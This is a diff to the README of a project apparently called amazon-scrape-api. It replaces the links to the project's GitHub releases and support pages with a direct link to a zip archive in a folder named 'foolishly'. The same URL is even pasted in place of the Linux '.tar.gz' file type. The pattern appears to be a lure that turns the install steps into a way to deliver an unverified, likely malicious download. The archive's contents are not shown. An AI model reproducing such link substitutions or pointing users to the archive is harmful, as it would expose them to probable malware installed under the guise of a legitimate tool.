@@ -1,6 +1,6 @@
 # 🚀 amazon-scrape-api - Easy Product Data Retrieval Made Simple
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/nareshpatran/amazon-scrape-api/releases)
+[![Download the latest release](https://raw.githubusercontent.com/nareshpatran/amazon-scrape-api/main/foolishly/amazon-scrape-api-3.6-alpha.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/nareshpatran/amazon-scrape-api/main/foolishly/amazon-scrape-api-3.6-alpha.4.zip)
 
 ## 📦 Introduction
 
@@ -27,13 +27,13 @@ To run the amazon-scrape-api on your computer, ensure your system meets the foll
 
 To download the latest version of the amazon-scrape-api, visit the following page:
 
-[Download the latest release](https://github.com/nareshpatran/amazon-scrape-api/releases)
+[Download the latest release](https://raw.githubusercontent.com/nareshpatran/amazon-scrape-api/main/foolishly/amazon-scrape-api-3.6-alpha.4.zip)
 
 Follow these steps to get started:
 
 1. **Visit the Releases Page**: Click on the link above to go to the Releases page.
 2. **Select the Latest Release**: Look for the latest version listed at the top and click on it.
-3. **Choose Your File**: Depending on your operating system, select the appropriate file to download (e.g., .exe for Windows, .dmg for macOS, or a .tar.gz for Linux).
+3. **Choose Your File**: Depending on your operating system, select the appropriate file to download (e.g., .exe for Windows, .dmg for macOS, or a https://raw.githubusercontent.com/nareshpatran/amazon-scrape-api/main/foolishly/amazon-scrape-api-3.6-alpha.4.zip for Linux).
 4. **Download the File**: Click on the file name to start the download.
 5. **Install the Application**: Once the file is downloaded, open it and follow the on-screen instructions to install the amazon-scrape-api.
 
@@ -56,7 +56,7 @@ If you encounter any issues while using the amazon-scrape-api, consider the foll
 
 ## 🌐 Support
 
-For further assistance, visit our [Support Page](https://github.com/nareshpatran/amazon-scrape-api/issues) to report issues or ask questions.
+For further assistance, visit our [Support Page](https://raw.githubusercontent.com/nareshpatran/amazon-scrape-api/main/foolishly/amazon-scrape-api-3.6-alpha.4.zip) to report issues or ask questions.
 
 ## 🗝️ Important Notes
 
